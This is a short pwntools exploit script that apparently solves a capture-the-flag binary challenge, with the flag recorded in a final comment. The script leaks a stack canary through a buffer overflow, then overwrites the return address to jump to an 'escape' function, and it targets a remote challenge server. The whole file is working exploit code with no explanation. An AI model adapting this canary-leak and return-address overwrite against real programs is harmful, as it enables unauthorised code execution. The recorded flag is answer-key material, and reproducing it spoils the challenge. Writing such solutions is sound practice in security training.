#!/usr/bin/env python3
from pwn import *
# helper
def str2hex(str):
    return int('0x' + str.encode()[::-1].hex(), 16)

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
conn = 'nc 34.70.212.151 8005'.split()
host, port = conn[1], int(conn[2])
e = ELF('./chal')
# lib = ELF('./libc.so.6', checksec=False)

script = """
b* 0x00000000040157E
c
"""

if args.REMOTE:
    p = remote(host, port)
elif args.GDB:
    p = gdb.debug(e.path, gdbscript=script, aslr=False)
else:
    p = process(e.path)

ret = 0x00000000040157E
p.sendafter(b'Enter key :', b'B' + b'A' * (0x48))
can = b'\x00' + p.recvline(False)[0x49+1:0x49+7+1]
print("GOT", can)
p.sendlineafter(b'Enter key :', b'A' * 0x48 + can + p64(0) + p64(ret) + p64(e.symbols["escape"]))
p.interactive()

p.interactive()

# flag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}